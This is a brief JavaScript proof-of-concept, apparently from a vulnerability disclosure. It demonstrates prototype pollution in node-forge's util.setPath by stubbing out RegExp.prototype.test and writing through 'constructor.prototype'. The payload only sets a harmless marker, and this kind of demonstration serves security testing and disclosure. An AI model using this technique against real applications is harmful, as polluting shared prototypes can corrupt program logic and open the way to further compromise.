RegExp.prototype.test = () => false;
console.log({}.polluted);
const nodeforge = require('node-forge');
const obj = {};
nodeforge.util.setPath(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);